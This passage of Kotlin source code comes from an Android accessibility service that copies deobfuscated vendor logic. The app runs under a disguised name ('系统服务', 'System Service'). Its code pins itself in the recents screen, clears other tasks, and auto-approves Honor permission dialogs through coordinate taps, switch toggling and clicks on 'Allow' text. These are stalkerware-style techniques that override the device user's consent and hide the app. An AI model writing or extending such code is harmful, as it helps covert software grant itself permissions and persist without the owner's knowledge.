     *    suspend logic — same observable side-effects.
     *  - `m212175c2()` is vendored as `findAppCardRect()` (implemented below).
     *    Linear suspend port is functionally equivalent to vendor's state machine.
     *  - `m212203g0(x,y1,y2)` (swipe-down gesture) uses GestureDescription Path from y1 to y2.
     *    Replica implements inline; vendor wraps in a coroutine continuation.
     *  - Vendor returns Boolean; replica open fun also returns Boolean for Mockito compatibility.
     */
    open suspend fun tryLockAppInRecents(): Boolean {
        val svc = service ?: return false
        return try {
            // Vendor L7784-7790: 1. 返回APP前台
            android.util.Log.d(TAG, "[锁定流程] 1. 返回APP前台")
            val launchIntent = context.packageManager
                ?.getLaunchIntentForPackage(context.packageName)
                ?.apply { addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK) }
            if (launchIntent != null) {
                context.startActivity(launchIntent)
            } else {
                android.util.Log.w(TAG, "[锁定流程] 无可用的启动 Activity，跳过返回前台")
            }
            delay(100L) // vendor L7793 b81.m210571b1(100L, ...)

            // Vendor L7797-7798: 2. 打开最近任务列表 — GLOBAL_ACTION_RECENTS = 3
            android.util.Log.d(TAG, "[锁定流程] 2. 打开最近任务列表")
            svc.performGlobalAction(3) // GLOBAL_ACTION_RECENTS
            delay(300L) // vendor L7801 b81.m210571b1(300L, ...)

            // Vendor L7803-7829: verify recents page is open
            val root = svc.rootInActiveWindow
            if (root != null) {
                val pkgName = root.packageName?.toString() ?: ""
                val isRecents = pkgName == "com.huawei.android.launcher" ||
                    pkgName == "com.hihonor.android.launcher" ||
                    pkgName.contains("launcher", ignoreCase = true) ||
                    pkgName.contains("recents", ignoreCase = true)
                val hasRecentsText = if (!isRecents) {
                    RECENTS_VERIFY_KEYWORDS.any { kw ->
                        val nodes = root.findAccessibilityNodeInfosByText(kw)
                        nodes != null && nodes.any { it.isVisibleToUser }
                    }
                } else false
                root.recycle()
                if (!isRecents && !hasRecentsText) {
                    android.util.Log.w(TAG, "[锁定流程] 未能打开最近任务列表")
                    return false
                }
            }
            android.util.Log.d(TAG, "[锁定流程] 最近任务列表已打开")
            delay(300L) // vendor L7834 b81.m210571b1(300L, ...)

            // Vendor L7835-7836: 3. 横向滑动激活任务列表 (m212201f8)
            android.util.Log.d(TAG, "[锁定流程] 3. 横向滑动激活任务列表")
            performHorizontalSwipe()
            delay(400L) // vendor L7839 b81.m210571b1(400L, ...)

            // Vendor L7841-7845: 4. 查找APP卡片
            android.util.Log.d(TAG, "[锁定流程] 4. 查找APP卡片...")
            val cardRect = findAppCardRect()
            if (cardRect == null) {
                android.util.Log.w(TAG, "[锁定流程] 未找到APP卡片")
                return false
            }
            android.util.Log.d(TAG, "[锁定流程] 找到APP卡片: $cardRect")

            // Vendor L7847: check if already locked (m212211g9)
            val lockState = verifyLockState()
            if (lockState == LockVerifyResult.Locked) {
                android.util.Log.d(TAG, "[锁定流程] APP已经是锁定状态，无需操作")
                return true
            }

            // Vendor L7848-7865: 5. 在APP位置执行下滑锁定 (m212203g0)
            android.util.Log.d(TAG, "[锁定流程] 在APP位置执行下滑锁定...")
            val height = getScreenHeightPx().toFloat()
            val fromY = height * 0.3f // vendor m212180d4() * 0.3f
            val toY = height * 0.65f  // vendor m212180d4() * 0.65f
            val swipeOk = performSwipeDownGesture(cardRect.centerX().toFloat(), fromY, toY)
            if (!swipeOk) {
                android.util.Log.w(TAG, "[锁定流程] ❌ 下滑手势执行失败")
                return false
            }

            // Vendor L7913-7929 (case 6): re-verify lock state
            val finalState = verifyLockState()
            return when (finalState) {
                LockVerifyResult.Locked -> {
                    android.util.Log.d(TAG, "[锁定流程] 验证通过：APP已锁定")
                    true
                }
                LockVerifyResult.Unlocked -> {
                    android.util.Log.w(TAG, "[锁定流程] 验证失败：仍未锁定")
                    false
                }
                LockVerifyResult.Unknown -> {
                    android.util.Log.w(TAG, "[锁定流程] 无法验证锁定状态，假设成功")
                    true
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[锁定流程] 异常: ${e.message}")
            false
        }
    }

    /**
     * Vendor m212211g9 (L7963-8110) — verify whether app card is locked in recents.
     *
     * Returns [LockVerifyResult]:
     *  - LOCKED  (f53977a0 = ordinal 0): "解锁"/"Unlock" button found → means app IS locked
     *             (the "unlock" button is only shown on already-locked cards)
     *  - UNKNOWN (f53979a2 = ordinal 2): cannot determine
     *  - NOT_LOCKED (f53978a1 = ordinal 1): "锁定"/"Lock" button found without "已"/"解" prefix
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor uses `f53977a0=LOCKED / f53978a1=NOT_LOCKED / f53979a2=UNKNOWN`
     * ordinal mapping. Replica uses sealed class with same semantics.
     */
    open fun verifyLockState(): LockVerifyResult {
        val svc = service ?: return LockVerifyResult.Unknown
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            ?: return LockVerifyResult.Unknown
        return try {
            // Vendor L7976-7051: check for "解锁" (unlock button = card IS locked)
            for (unlockKw in LOCK_INDICATOR_TEXTS) {
                val nodes = root.findAccessibilityNodeInfosByText(unlockKw) ?: continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        val txt = node.text?.toString() ?: ""
                        val cd = node.contentDescription?.toString() ?: ""
                        if ((txt == unlockKw || cd == unlockKw) &&
                            !txt.contains("已") && !txt.contains("解") &&
                            !cd.contains("已") && !cd.contains("解")) {
                            android.util.Log.d(TAG, "[锁定验证] 找到'$unlockKw'按钮 → 已锁定")
                            return LockVerifyResult.Locked
                        }
                    }
                }
            }
            // Vendor L7981-8009: check for "锁定" button (= NOT locked)
            val lockKws = listOf("锁定", "鎖定", "加锁", "Lock", "LOCK", "잠금", "잠그기", "Sperren", "Verrouiller")
            for (lockKw in lockKws) {
                val nodes = root.findAccessibilityNodeInfosByText(lockKw) ?: continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        val txt = node.text?.toString() ?: ""
                        val cd = node.contentDescription?.toString() ?: ""
                        if ((txt == lockKw || cd == lockKw) &&
                            !txt.contains("已") && !txt.contains("解") &&
                            !cd.contains("已") && !cd.contains("解")) {
                            android.util.Log.d(TAG, "[锁定验证] 找到'$lockKw'按钮 → 未锁定")
                            return LockVerifyResult.Unlocked
                        }
                    }
                }
            }
            // Vendor L8010-8044: check for lock icon by viewId
            for (viewId in LOCK_ICON_VIEW_IDS) {
                val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
                if (nodes != null && nodes.isNotEmpty() && nodes.any { it.isVisibleToUser }) {
                    android.util.Log.d(TAG, "[锁定验证] 找到锁定图标: $viewId → 已锁定")
                    return LockVerifyResult.Locked
                }
            }
            android.util.Log.d(TAG, "[锁定验证] 无法确认锁定状态")
            LockVerifyResult.Unknown
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    /**
     * Vendor m212167b4 L2777-2860 — find and click the "clear all recents" button.
     *
     * Three-tier fallback per vendor:
     *  1. viewId search (15 IDs, [CLEAR_ALL_RECENTS_VIEW_IDS])
     *  2. contentDescription search ([CLEAR_ALL_CONTENT_DESCS])
     *  3. text search ([CLEAR_ALL_TEXT_KEYWORDS]) with parent-walk fallback (3 levels)
     *
     * Returns true if a button was found and clicked (or tapped via coordinate).
     *
     * ADAPT: vendor uses `m212143a5(root, list, breadcrumbs)` to dump page text before
     * button search (L2780) — replica omits this log-only DFS call.
     * // ADAPT: log-only DFS page-text dump omitted (m212143a5)
     */
    internal fun findAndClickClearAllButton(logs: MutableList<String>): Boolean {
        val svc = service ?: return false
        // ADAPT: 真机加固 — rootInActiveWindow 可能指向 overlay 而非 Launcher 最近任务。
        // 遍历 service.windows 找 Launcher 包名的窗口 root，fallback 到 rootInActiveWindow。
        val root = try {
            svc.windows?.firstOrNull { w ->
                val pkg = w.root?.packageName?.toString() ?: ""
                pkg.contains("launcher", ignoreCase = true) || pkg.contains("recents", ignoreCase = true)
            }?.root ?: svc.rootInActiveWindow
        } catch (_: Exception) {
            try { svc.rootInActiveWindow } catch (_: Exception) { null }
        } ?: return false
        return try {
            // --- Tier 1: viewId search (vendor L2781-2803) ---
            for (viewId in CLEAR_ALL_RECENTS_VIEW_IDS) {
                val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
                if (nodes != null && nodes.isNotEmpty()) {
                    for (node in nodes) {
                        if (node.isVisibleToUser) {
                            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                android.util.Log.d(TAG, "[清除任务] ✅ resource-id点击成功")
                                logs.add("[Step9/10] ✅ resource-id点击成功: $viewId")
                                return true
                            }
                            // Coordinate tap fallback (vendor L2796-2800)
                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            if (!rect.isEmpty) {
                                gestureTapFast(rect.centerX().toFloat(), rect.centerY().toFloat())
                                android.util.Log.d(TAG, "[清除任务] ✅ 坐标点击成功")
                                logs.add("[Step9/10] ✅ 坐标点击成功: $viewId")
                                return true
                            }
                        }
                    }
                }
            }

            // --- Tier 2: contentDescription search (vendor L2806-2823) ---
            for (cd in CLEAR_ALL_CONTENT_DESCS) {
                android.util.Log.d(TAG, "[清除任务] 查找contentDescription: $cd")
                val node = findNodeByContentDesc(root, cd)
                if (node != null && node.isVisibleToUser) {
                    android.util.Log.d(TAG, "[清除任务] ✅ 找到contentDescription匹配: $cd")
                    if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        android.util.Log.d(TAG, "[清除任务] ✅ contentDescription点击成功")
                        logs.add("[Step9/10] ✅ contentDescription点击成功: $cd")
                        return true
                    }
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (!rect.isEmpty) {
                        gestureTapFast(rect.centerX().toFloat(), rect.centerY().toFloat())
                        logs.add("[Step9/10] ✅ contentDescription坐标点击成功: $cd")
                        return true
                    }
                }
            }

            // --- Tier 3: text search with parent-walk (vendor L2825-2856) ---
            for (kw in CLEAR_ALL_TEXT_KEYWORDS.distinct()) {
                android.util.Log.d(TAG, "[清除任务] 查找: $kw")
                val nodes = root.findAccessibilityNodeInfosByText(kw) ?: continue
                for (node in nodes) {
                    if (!node.isVisibleToUser) continue
                    val txt = node.text?.toString() ?: ""
                    // vendor L2835: exact match or containsIgnoreCase
                    if (txt != kw && !txt.contains(kw, ignoreCase = true)) continue
                    if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        android.util.Log.d(TAG, "[清除任务] ✅ 文本点击成功: $kw")
                        logs.add("[Step9/10] ✅ 文本点击成功: $kw")
                        return true
                    }
                    // vendor L2839-2846: parent-walk up to 3 levels
                    var parent = node.parent
                    var depth = 0
                    while (parent != null && depth < 3) {
                        if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                            android.util.Log.d(TAG, "[清除任务] ✅ 父节点点击成功: $kw")
                            logs.add("[Step9/10] ✅ 父节点点击成功: $kw")
                            return true
                        }
                        parent = parent.parent
                        depth++
                    }
                    // vendor L2847-2850: coordinate tap final fallback
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (!rect.isEmpty) {
                        gestureTapFast(rect.centerX().toFloat(), rect.centerY().toFloat())
                        logs.add("[Step9/10] ✅ 坐标点击成功: $kw")
                        return true
                    }
                }
            }

            android.util.Log.d(TAG, "[清除任务] ❌ 未找到清除按钮")
            false
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    /**
     * Vendor m212175c2 (L5956-6029) — find the app card Rect in the recents screen.
     *
     * Searches for visible nodes matching:
     *  1. appLabel (m212178d1() = appLabel field)
     *  2. packageName
     *  3. appLabel short-name variants (last segment after ".")
     *
     * Returns null if no card found.
     * `open` for test spy override.
     *
     * NOTE: vendor m212178d1() retrieves app label via lazy `f55077b5`. Replica uses
     * [appLabel] and [packageName] fields directly — same values at runtime, eager-vs-lazy
     * is immaterial for correctness. No TODO — this equivalence is intentional.
     */
    open fun findAppCardRect(): Rect? {
        val svc = service ?: return null
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        // ADAPT: real-device hardening — 华为 FIN-AL60 真机测试发现 appLabel="系统服务"（伪装名）
        // 未在最近任务卡片中匹配成功（见 /tmp/huawei-t19e.log Step9 "未找到 APP 卡片"）。
        // 原因：最近任务卡片常以 contentDescription 或 packageName 标识，而非伪装 appLabel。
        // 委托 AppCardMatcher（三策略：appLabel text → packageName text → contentDescription DFS）。
        // vendor 主路径（Strategy 1: appLabel）保留为 AppCardMatcher 内部第一策略。
        val rect = AppCardMatcher.findCardRect(root, appLabel = appLabel, packageName = packageName)
        if (rect != null) {
            android.util.Log.d(TAG, "[查找APP卡片] ✅ 命中 ($rect)")
        } else {
            android.util.Log.w(TAG, "[查找APP卡片] ❌ 全部 3 种策略未命中 (appLabel=$appLabel, pkg=$packageName)")
        }
        return rect
    }

    /**
     * Vendor m212201f8 (L7330-7343) — horizontal swipe to activate recents task list.
     *
     * Swipes from right (85% of screen width) to left (15%) at vertical 45% of screen height.
     * Duration = 400ms, start offset = 10ms.
     * `open` for test spy override.
     */
    open fun performHorizontalSwipe() {
        val svc = service ?: return
        try {
            val fromX = getScreenWidthPx() * 0.85f  // vendor m212181d5() * 0.85f
            val toX = getScreenWidthPx() * 0.15f    // vendor m212181d5() * 0.15f
            val y = getScreenHeightPx() * 0.45f     // vendor m212180d4() * 0.45f
            android.util.Log.d(TAG, "[横向滑动] 华为: ($fromX, $y) -> ($toX, $y), 时长=400ms")
            val path = Path()
            path.moveTo(fromX, y)
            path.lineTo(toX, y)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(
                    android.accessibilityservice.GestureDescription.StrokeDescription(path, 10L, 400L)
                )
                .build()
            svc.dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[横向滑动] 失败: ${e.message}")
        }
    }

    /**
     * Vendor m212203g0(x, fromY, toY) (L7362-7386) — swipe-down gesture for locking app in recents.
     *
     * Creates a vertical swipe Path from (x, fromY) to (x, toY) with duration 500ms.
     * Vendor uses a coroutine continuation callback; replica wraps in a simpler boolean return.
     * `open` for test spy override.
     *
     * ADAPT: vendor m212203g0 uses a Coroutine + CountDownLatch pattern for async completion
     * notification; replica dispatches the gesture and returns true/false based on
     * dispatchGesture result — same net effect on the UI for the durations involved.
     */
    open fun performSwipeDownGesture(x: Float, fromY: Float, toY: Float): Boolean {
        val svc = service ?: return false
        return try {
            // Vendor L7367-7370: Path moveTo x,fromY → lineTo x,toY
            val path = Path()
            path.moveTo(x, fromY)
            path.lineTo(x, toY)
            // Vendor L7370: StrokeDescription(path, 10L, 500L)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(
                    android.accessibilityservice.GestureDescription.StrokeDescription(path, 10L, 500L)
                )
                .build()
            val ok = svc.dispatchGesture(gesture, null, null)
            if (!ok) android.util.Log.w(TAG, "[下滑手势] dispatchGesture返回false")
            ok
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[下滑手势] 失败: ${e.message}")
            false
        }
    }

    /**
     * Vendor performGlobalAction(2=HOME) — return to home screen after recents cleanup.
     * Extracted as open method so tests can spy without touching AccessibilityService.
     * `open` for test spy override.
     *
     * ADAPT: vendor calls f55063a1.performGlobalAction(2) directly (GLOBAL_ACTION_HOME = 2).
     */
    open fun performGlobalActionHome() {
        try {
            service?.performGlobalAction(2) // GLOBAL_ACTION_HOME = 2
        } catch (_: Exception) {}
    }

    /**
     * Vendor gesture tap (m212200f7, L7318-7327) — synchronous single-point tap.
     * Forwards to [HuaweiGestureHelper.gestureTapFast] for consistency with other steps.
     *
     * ADAPT: steps T7-T14 use [HuaweiGestureHelper] for gestures; step 9 also delegates here
     * for DRY compliance. Vendor inline; replica delegates.
     */
    internal fun gestureTapFast(x: Float, y: Float): Boolean {
        return HuaweiGestureHelper(service).gestureTapFast(x, y)
    }

    /**
     * Find the first node whose contentDescription equals [desc] (DFS).
     * Vendor m212147c4 (L2811) uses this pattern.
     */
    private fun findNodeByContentDesc(root: AccessibilityNodeInfo, desc: String): AccessibilityNodeInfo? {
        val cd = root.contentDescription?.toString() ?: ""
        if (cd == desc) return root
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findNodeByContentDesc(child, desc)
            if (found != null) return found
        }
        return null
    }

    // =========================================================================
    // T17 — detectAndClickHonorPermissionDialog (vendor m212161a8, L915-1309)
    // =========================================================================

    /**
     * Vendor C0365a2 m212161a8 (L915-1309) — 荣耀权限对话框检测 + 多模式点击。
     *
     * Vendor flow (coroutine state-machine, deobfuscated):
     *
     *  [case 0 / detection]
     *   - Iterate `service.getWindows()`; for each window, get `title.toString()`.
     *   - If title matches permission keywords (`m212155e9` = [isHonorPermissionTitle]):
     *     1. Log "[荣耀权限] 检测到弹窗: <title>"
     *     2. Compute [HonorPercentConfig] from title via `m212152d3` = [getHonorPercentConfig]
     *     3. Primary coord click: x=width*x1, y=height*y1 via [gestureCoordinateTap]
     *     4. delay(100ms) — vendor b81.m210571b1(100L)
     *
     *  [case 1 / primary-tap outcome]
     *   - `m212179d2()` = [currentHonorPermissionTitle]: still same title?
     *     → same → go to alternate coord (case 1 body below)
     *     → changed (null or different) → return Clicked (primary worked, L1154-1155)
     *
     *   Alternate coord:  x=width*x2, y=height*y2 via [gestureCoordinateTap]
     *   delay(100ms) — vendor b81.m210571b1(100L)
     *
     *  [case 2 / alt-tap outcome]
     *   - Still same? → go to 模式1,2,3 (case 2 body)
     *   → changed → return Clicked (alt-tap worked, L1184-1185)
     *
     *  [模式1 — 遍历开关 (case 2/3)]
     *   - [clickFirstUncheckedSwitchViaGesture] = vendor m212159a2: find all Switch/CheckBox/Toggle
     *     nodes, click first unchecked one via dispatchGesture(100ms)
     *   - delay(100ms)
     *
     *  [case 3 / 模式1 outcome]
     *   - Still same? → go to 模式2
     *   → changed → return Clicked (模式1 worked, L1194-1195)
     *
     *  [模式2 — 点击允许文本 (case 3/4)]
     *   - Iterate [MODE2_KEYWORDS] array (10 entries, L1040):
     *     "允许","始终允许","仅在使用中允许","确定","同意","Allow","Allow always",
     *     "While using the app","OK","Agree"
     *   - For each keyword: find nodes via getRootInActiveWindow().findAccessibilityNodeInfosByText;
     *     iterate, if clickable → performAction(ACTION_CLICK) + delay(100ms)
     *   - delay(100ms) after full loop — vendor b81.m210571b1(100L) state 5
     *
     *  [case 5 / 模式2 outcome]
     *   - Still same? → go to 模式3
     *   → changed → return Clicked (模式2 worked, L1108-1109, L1233-1234)
     *
     *  [模式3 — 底部区域扫描点击]
     *   - y = height * 0.92f (vendor L1089)
     *   - Iterate x fractions [0.25f, 0.5f, 0.75f] (vendor L1091):
     *     click (width*frac, y) via [gestureCoordinateTap], delay(100ms)
     *     After each click: re-check — if changed → return Clicked (模式3 worked, L1244-1245)
     *   - If all 3 x positions exhausted without change: log "所有模式都无效",
     *     return NotFound (vendor f53975a2, L1095-1096)
     *
     *  [no matching window found]
     *   - Return NotFound (vendor f53974a1, L1129)
     *
     * Exception catch (outer try, L1121-1125):
     *   - Log "检测异常" + return NotFound (vendor f53973a0 = NOT_FOUND in exception path)
     *
     * ADAPT:
     *  - Vendor `f55064a2` (isHonor flag) is TRUE for Honor devices. In replica, `isHuawei`
     *    is TRUE for Honor (Brand=="honor"). Guard `if (!isHuawei) return NotFound` skips
     *    non-Honor devices, mirroring vendor's placement: this method is only invoked on Honor.
     *  - Vendor's `m212179d2()` inspects both windows list and rootInActiveWindow text patterns.
     *    Replica [currentHonorPermissionTitle] is an `open` method returning the first window
     *    title that matches [isHonorPermissionTitle], falling back to rootInActiveWindow regex.
     *    Tests override it directly.
     *  - `gestureCoordinateTap` is already an `open suspend` method (added in the replica for
     *    T14/T15 gesture taps). We reuse it here so tests can spy without touching the service.
     *  - Vendor uses `CountDownLatch`-based blocking (`m212202f9`); replica delegates to
     *    [gestureCoordinateTap] which uses [GestureTapHelper.performTap] (async + delay).
     *    Observable timing is equivalent for real devices.
     *  - `clickFirstUncheckedSwitchViaGesture` is extracted as `open` for spy-based test isolation.
     *  - `findVisibleClickableNodeByText` is extracted as `open` for spy-based test isolation.
     *  - Vendor `f53973a0` and `f53974a1` are both "success-equivalent" (CLICKED) enum entries;
     *    replica merges them into `HonorClickResult.Clicked("")`.
     *  - Vendor `f53975a2` (ALL_MODES_FAILED) is distinct from `f53974a1` (NOT_FOUND); replica
     *    maps both to `HonorClickResult.NotFound` per T4 design decision (NotFound covers both).
     */
    open suspend fun detectAndClickHonorPermissionDialog(): HonorClickResult {
        // Guard: only run on Honor (isHuawei == true → IS Honor)
        // Vendor: f55064a2 is the Honor flag; method body runs on Honor devices.
        if (!isHuawei) return HonorClickResult.NotFound
        // ADAPT: plan snippet shows `if (isHuawei) return NotFound` but that is inverted —
        // this method is Honor-only, so we need `if (!isHuawei)`. The plan comment
        // "vendor guard 与 Step1/Step4 相反" confirms the guard is opposite to Step1
        // (Step1 skips Honor; this method skips non-Honor).

        try {
            // --- Detection phase (vendor case 0, L962-1128) ---
            val windowTitle = getHonorPermissionWindowTitle() ?: return HonorClickResult.NotFound

            android.util.Log.d(TAG, "[荣耀权限] 检测到弹窗: $windowTitle")
            val cfg = getHonorPercentConfig(windowTitle)
            android.util.Log.d(TAG, "[荣耀权限] ${cfg.description}")
            val w = getScreenWidthPx()
            val h = getScreenHeightPx()
            android.util.Log.d(TAG, "[荣耀权限] 屏幕尺寸: ${w}x${h}")

            // --- Primary coord click (vendor L977-998) ---
            val px = (w * cfg.x1).toInt()
            val py = (h * cfg.y1).toInt()
            android.util.Log.d(TAG, "[荣耀权限] 主坐标: (${(cfg.x1 * 100).toInt()}%, ${(cfg.y1 * 100).toInt()}%) → ($px, $py)")
            gestureCoordinateTap(px.toFloat(), py.toFloat())
            delay(100L) // vendor b81.m210571b1(100L) state 1

            // --- Check primary tap outcome (vendor case 1, L1130-1155) ---
            val afterPrimary = currentHonorPermissionTitle()
            if (afterPrimary == null || afterPrimary != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 主坐标点击有效，弹窗已变化")
                return HonorClickResult.Clicked("")
            }

            // --- Alternate coord click (vendor L1009-1022) ---
            android.util.Log.d(TAG, "[荣耀权限] 主坐标点击无效，弹窗未变化，尝试备用坐标...")
            val ax = (w * cfg.x2).toInt()
            val ay = (h * cfg.y2).toInt()
            android.util.Log.d(TAG, "[荣耀权限] 备用坐标: (${(cfg.x2 * 100).toInt()}%, ${(cfg.y2 * 100).toInt()}%) → ($ax, $ay)")
            gestureCoordinateTap(ax.toFloat(), ay.toFloat())
            delay(100L) // vendor b81.m210571b1(100L) state 2

            // --- Check alt-tap outcome (vendor case 2, L1156-1185) ---
            val afterAlt = currentHonorPermissionTitle()
            if (afterAlt == null || afterAlt != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 备用坐标点击有效，弹窗已变化")
                return HonorClickResult.Clicked("")
            }

            // === 模式1: 遍历开关 (vendor L1028-1035, m212159a2) ===
            android.util.Log.d(TAG, "[荣耀权限] 主备坐标都无效，尝试所有模式...")
            android.util.Log.d(TAG, "[荣耀权限] 模式1: 遍历开关")
            clickFirstUncheckedSwitchViaGesture()
            delay(100L) // vendor b81.m210571b1(100L) state 3

            // --- Check 模式1 outcome (vendor case 3, L1186-1195) ---
            val afterMode1 = currentHonorPermissionTitle()
            if (afterMode1 == null || afterMode1 != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 模式1有效")
                return HonorClickResult.Clicked("")
            }

            // === 模式2: 点击允许文本 (vendor L1039-1082) ===
            android.util.Log.d(TAG, "[荣耀权限] 模式2: 点击允许文本")
            for (keyword in MODE2_KEYWORDS) {
                val node = findVisibleClickableNodeByText(keyword, false) ?: continue
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                delay(100L) // vendor b81.m210571b1(100L) state 4
            }
            delay(100L) // vendor b81.m210571b1(100L) state 5

            // --- Check 模式2 outcome (vendor case 5, L1216-1234) ---
            val afterMode2 = currentHonorPermissionTitle()
            if (afterMode2 == null || afterMode2 != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 模式2有效")
                return HonorClickResult.Clicked("")
            }

            // === 模式3: 底部区域扫描点击 (vendor L1088-1106) ===
            android.util.Log.d(TAG, "[荣耀权限] 模式3: 底部区域扫描点击")
            val bottomY = (h * 0.92f).toInt()
            val xFractions = listOf(0.25f, 0.5f, 0.75f) // vendor AbstractC0716jf.m213306g5 L1091
            for (xFrac in xFractions) {
                val scanX = (w * xFrac).toInt()
                android.util.Log.d(TAG, "[荣耀权限] 点击: ($scanX, $bottomY)")
                gestureCoordinateTap(scanX.toFloat(), bottomY.toFloat())
                delay(100L) // vendor b81.m210571b1(100L) state 6

                // Check after each bottom scan click (vendor case 6, L1240-1249)
                val afterMode3 = currentHonorPermissionTitle()
                if (afterMode3 == null || afterMode3 != windowTitle) {
                    android.util.Log.d(TAG, "[荣耀权限] 模式3有效")
                    return HonorClickResult.Clicked("")
                }
            }

            // All modes exhausted (vendor L1095-1096: return f53975a2)
            android.util.Log.d(TAG, "[荣耀权限] 所有模式都无效")
            return HonorClickResult.NotFound

        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            // Vendor L1121-1125: catch Exception → log + return NOT_FOUND
            android.util.Log.w(TAG, "[荣耀权限] 检测异常: ${e.message}")
            return HonorClickResult.NotFound
        }
    }

    /**
     * Vendor m212179d2 (L6093-6122) — find current window title that matches [isHonorPermissionTitle].
     *
     * Vendor logic:
     *  1. Try `service.getWindows()` iteration; return first title that passes m212155e9.
     *  2. Fallback: `rootInActiveWindow.findAccessibilityNodeInfosByText(patterns)` — find first
     *     node matching complex regex patterns for permission text.
     *
     * Replica: step 1 is exact 1:1. Step 2 (rootInActiveWindow regex patterns) is partially
     * replicated — vendor uses 24 regex patterns via `m212148c5` (not ported); replica returns
     * the first permission-matching node text found in root as a simpler approximation.
     *
     * `open` for test spy override.
     *
     * NOTE: vendor m212179d2 step 2 uses 24 regex patterns via m212148c5 for DFS matching.
     * Replica covers the windows-list path (primary signal on real devices) + first-node
     * text fallback. Regex-DFS is a future enhancement, not a correctness gap — if T19
     * 真机验证 shows dialogs slipping through, revisit.
     */
    open fun currentHonorPermissionTitle(): String? {
        val svc = service ?: return null
        try {
            val windows = svc.windows
            if (windows != null) {
                for (win in windows) {
                    val t = win.title?.toString() ?: continue
                    if (isHonorPermissionTitle(t)) return t
                }
            }
        } catch (_: Exception) {}
        try {
            val root = svc.rootInActiveWindow ?: return null
            // Simplified step-2 fallback: collect texts and find first permission-matching text.
            // Vendor uses 24 regex patterns; replica uses keyword substring match.
            val texts = HuaweiPageDetector.collectTexts(root)
            for (t in texts) {
                if (isHonorPermissionTitle(t)) return t
            }
        } catch (_: Exception) {}
        return null
    }

    /**
     * Vendor m212179d2-like check used in the detectAndClickHonorPermissionDialog detection phase:
     * scan ALL windows and return the first title matching [isHonorPermissionTitle].
     *
     * Vendor case 0 (L962-968): iterates `service.getWindows()` to find any window with
     * a permission-related title. If none found → return NOT_FOUND immediately.
     *
     * `open` for test spy override.
     *
     * ADAPT: extracted to a separate method from [currentHonorPermissionTitle] to allow
     * tests to stub "initial window present" vs "window changed" independently.
     */
    open fun getHonorPermissionWindowTitle(): String? {
        val svc = service ?: return null
        return try {
            val windows = svc.windows ?: return null
            for (win in windows) {
                val t = win.title?.toString() ?: continue
                if (isHonorPermissionTitle(t)) return t
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Vendor m212159a2 (L828-865) — click first UNCHECKED Switch/CheckBox/Toggle via gesture.
     *
     * Vendor flow:
     *  1. `getRootInActiveWindow()` → collect all Switch/CheckBox/Toggle nodes via `m212151d0`
     *     (DFS, className substring: "Switch" | "CheckBox" | "Toggle")
     *  2. Iterate; for each node where `!isChecked()`:
     *     - Get bounding rect centerX, centerY
     *     - Build `GestureDescription.StrokeDescription(path, 0L, 100L)` with single moveTo(center)
     *     - `dispatchGesture` + `CountDownLatch.await(500ms)`
     *     - Return immediately after first gesture dispatch
     *
     * Replica: delegates DFS switch collection to [SwitchNodeFinder] (already in project).
     * Gesture dispatch uses [GestureTapHelper.performTap] with 100ms duration (= vendor L7349).
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor m212159a2 collects only 3 className variants
     * ("Switch" | "CheckBox" | "Toggle"); [SwitchNodeFinder.findFirstUnchecked] adds
     * "ToggleButton" and "slide" for broader compatibility — these are additive extensions.
     */
    open fun clickFirstUncheckedSwitchViaGesture(): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val node = SwitchNodeFinder.findFirstUnchecked(root) ?: return false
        val rect = android.graphics.Rect()
        node.getBoundsInScreen(rect)
        val cx = rect.exactCenterX()
        val cy = rect.exactCenterY()
        android.util.Log.d(TAG, "[clickFirstUncheckedSwitch] 点击开关: ($cx, $cy)")
        // Vendor m212159a2 L851: StrokeDescription(path, 0L, 100L)
        return HuaweiGestureHelper(svc).gestureTapFast(cx, cy)
    }

    /**
     * Find the first VISIBLE + CLICKABLE node matching [text] in the current rootInActiveWindow.
     *
     * Used by 模式2 keyword loop in [detectAndClickHonorPermissionDialog] (vendor L1044-1067).
     *
     * Vendor (L1045-1067): `rootInActiveWindow.findAccessibilityNodeInfosByText(keyword)` →
     * iterate → if `isClickable()` → performAction(16=ACTION_CLICK). Replica extracts this
     * lookup so tests can stub individual keyword lookups without needing a real AccessibilityService.
     *
     * `open` for test spy override.
     *
     * @param text     keyword text to search
     * @param exact    currently unused (false = substring match per vendor L1045 semantics);
     *                 kept for API symmetry with [clickTextOnCurrentRoot].
     */
    open fun findVisibleClickableNodeByText(text: String, exact: Boolean): AccessibilityNodeInfo? {
